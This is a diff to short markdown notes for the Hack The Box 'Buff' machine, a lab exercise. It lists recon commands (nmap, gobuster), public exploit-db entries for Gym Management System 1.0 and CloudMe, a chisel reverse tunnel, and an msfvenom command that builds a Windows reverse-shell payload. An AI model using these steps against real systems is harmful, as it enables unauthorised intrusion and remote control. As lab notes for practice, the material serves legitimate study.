@@ -1,6 +1,6 @@
 # Buff Tips
 
-# ${{\color{purple}Box Buff}}\ $
+# ${{\color{purple}Initial Recon}}\ $
 
 `nmap -sC -sV -oA buff 10.10.10.198` 
 ### or 
@@ -10,12 +10,15 @@
 
 * Inspect source code
 * Launch gobuster at the same time 
+
+`gobuster dir -u http://10.10.10.198:8080/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster.out`
 * Download an image and look at the metadata check the date of upload with `exiftool`
-* Visit the site as a user
+* Visit the site as a user :white_check_mark:
 * Add a proxy in the exploit to redirect flows to burp
 
 `searchsploit Gym Management System 1.0`
 
+# ${{\color{purple}Exploitation}}\ $
 https://www.exploit-db.com/48506
 
 `searchsploit -m php/webapps/48506.py`
@@ -33,6 +36,8 @@ https://www.exploit-db.com/48506
 `./chisel server --reverse --port 9002`
 
 # ${{\color{purple}Privilege Escalation}}\ $
+https://www.exploit-db.com/exploits/48389
+
 `msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.X.X LPORT=1234 EXITFUNC=thread-b '\x00\x0A\x0D' -f python`
 
 `python buffer_CloudMe_1112.py`
